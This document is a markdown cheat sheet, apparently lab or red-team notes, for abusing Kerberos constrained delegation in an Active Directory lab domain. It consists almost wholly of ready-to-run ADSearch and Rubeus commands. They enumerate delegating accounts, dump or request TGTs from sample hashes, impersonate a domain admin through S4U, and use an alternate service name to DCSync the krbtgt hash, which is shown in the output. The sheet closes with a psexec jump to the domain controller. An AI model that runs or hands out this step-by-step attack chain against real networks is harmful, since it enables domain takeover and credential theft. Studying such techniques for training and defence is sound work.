# Find the user/computer accounts that are allowed to delegate to another machine

```bash
# Computer
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

# User
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
```

---

# Next we need a TGT for that user/computer that can delegate to another one

```bash
# If we have access to the machine that can delegate to another we can dump it's tickets
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If we have an ntlm hash we can ask for a ticket directly
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:sql-2$ /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7
# or ekeys
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:sql-2$ /aes256:e27b2e7b39f59c3738813a9ba8c20cd5864946f179c80f60067f5cda59c3bd27 /createnetonly:C:\Windows\System32\cmd.exe

# We impersonate whoever we want, in this case nlamb cuz we know she is a domain admin
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap

# The previous command will give us two tickets (grab the last one cuz is the one impersonating)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv

# Steal the token of the previously created process
steal_token 5540
```

# We alternatively can use the Alternate Service Name abuse to be able to jump laterally

```bash
# Since cifs does not allow us to move laterally we can change the name to LDAP service to be able to do a DSYNC attack

# If we have access to the machine that can delegate to another we can dump it's tickets
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If we have an ntlm hash we can ask for a ticket directly
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:sql-2$ /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /nowrap
# or ekeys
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:sql-2$ /aes256:e27b2e7b39f59c3738813a9ba8c20cd5864946f179c80f60067f5cda59c3bd27 /createnetonly:C:\Windows\System32\cmd.exe

# With the content of the ticket we impoersonate someone but with an alternative service such as LDAP to dcsync
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /altservice:ldap /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv
steal_token 2580
dcsync dev.cyberbotic.io DEV\krbtgt

SAM Username         : krbtgt
...
Credentials:
  Hash NTLM: 9fb924c244ad44e934c390dc17e02c3d


# With the content of the ticket we impoersonate someone but with an to jump
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv
jump psexec64 dc-2.dev.cyberbotic.io smb
```
